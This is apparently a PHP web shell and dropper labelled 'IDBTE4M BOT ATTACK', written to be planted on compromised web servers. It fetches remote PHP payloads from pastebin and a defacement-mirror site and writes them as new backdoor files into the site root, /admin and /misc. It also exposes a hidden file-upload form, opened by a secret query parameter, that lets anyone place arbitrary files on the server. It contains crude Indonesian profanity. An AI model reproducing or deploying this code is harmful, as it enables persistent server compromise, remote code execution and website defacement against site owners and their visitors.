<center><h1>IDBTE4M BOT ATTACK</h1>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/why.php" ;
$text1 = http_get('https://pastebin.com/raw/wvxe9bRE');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/admin/asu.php" ;
$text2 = http_get('https://pastebin.com/raw/NSsNtCfR');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/misc/minyak.php" ;
$text3 = http_get('https://pastebin.com/raw/wvxe9bRE');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
$check21 = $_SERVER['DOCUMENT_ROOT'] . "/who.php" ;
$text21 = http_get('http://zonehmirrors.org/defaced/2017/12/01/shedex.org/shedex.org/kampang.php');
$open21 = fopen($check21, 'w');
fwrite($open21, $text21);
fclose($open21);
if(file_exists($check21)){
}
?>
<?php
if($_GET['ti'] == 'kung') {
	echo '<h1>KONTOL NGACENG</h1><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
        else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
}
}
?>